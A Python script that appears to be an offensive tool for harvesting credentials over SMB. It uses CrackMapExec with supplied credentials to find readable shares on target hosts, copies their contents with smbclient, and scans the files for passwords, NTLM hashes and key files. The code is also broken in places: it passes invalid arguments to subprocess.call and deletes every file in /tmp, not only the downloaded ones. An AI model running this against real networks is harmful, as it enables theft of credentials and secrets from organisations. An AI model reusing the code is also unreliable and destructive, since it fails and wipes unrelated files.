import argparse
import os
import re
import subprocess

# Keywords to match potential passwords and hashes
keywords = ["pass", "pw", "creds", "secret", "private", "key", "ntlm", "pfx", "rsa", "ssh"]

# Regex to match potential passwords
password_pattern = re.compile("((?=.*\d)(?=.*[a-z])(?=.*[A-Z])(?=.*[\W_]).{8,})")

# Regex to match potential NTLM hashes
ntlm_pattern = re.compile("([0-9a-fA-F]{32})")

# Regex to match potential PFX files
pfx_pattern = re.compile("(.*\.pfx)")

# Regex to match potential RSA keys
rsa_pattern = re.compile("(.*\.key)")

# Parse command line arguments
parser = argparse.ArgumentParser(description="Download contents of readable SMB shares and check for passwords and hashes")
parser.add_argument("ip", help="Target IP address or path to file with list of IP addresses")
parser.add_argument("username", help="Username for authentication")
parser.add_argument("password", help="Password for authentication")
args = parser.parse_args()

# Get list of IP addresses to scan
if os.path.isfile(args.ip):
    with open(args.ip, 'r') as f:
        ips = f.read().splitlines()
else:
    ips = [args.ip]

# Iterate through each IP address and check SMB shares for passwords and hashes
for ip in ips:
    # Run CrackMapExec to retrieve list of readable SMB shares
    shares = subprocess.check_output(["crackmapexec", ip, "-u", args.username, "-p", args.password, "--shares"])
    shares = shares.decode('utf-8')

    # Parse share names from the output that have READ permissions
    share_names = [line.split()[-1] for line in shares.splitlines() if "READ" in line]

    # Download contents of each share and check files for passwords and hashes
    for share_name in share_names:
        share_path = "\\\\{}\\{}".format(ip, share_name)
        try:
            # Check if the share is accessible
            os.listdir(share_path)
            # Download all files in the share
            smbclient_command = ["smbclient", "//{}/{}".format(ip, share_name), "-c", "prompt off;recurse;lcd /tmp/;mget *"]
            subprocess.call(smbclient_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            shell=False, encoding="utf-8", errors="ignore", username=args.username, password=args.password)
            # Check each file for passwords and hashes
            files = os.listdir("/tmp/")
            for file_name in files:
                with open("/tmp/" + file_name, 'r', encoding="utf8", errors='ignore') as file:
                    for line in file:
                        # Check if line matches password pattern or keywords
                        if password_pattern.match(line) or any(keyword in line.lower() for keyword in keywords):
                            print("Possible password found in file:", file_name, "on IP:", ip)
                            break
                        # Check if line matches NTLM hash pattern
                        if ntlm_pattern.match(line):
                            print("Possible NTLM hash found in file:", file_name, "on IP:", ip)
                            break
                # Check if file matches PFX or RSA key pattern
                if pfx_pattern.match(file_name) or rsa_pattern.match(file_name):
                    print("Possible PFX or RSA key found:", file_name, "on IP:", ip)
                # Delete the file after it has been checked
                os.remove("/tmp/" + file_name)
        except:
            # Unable to access the share
            print("Unable to access share", share_name)
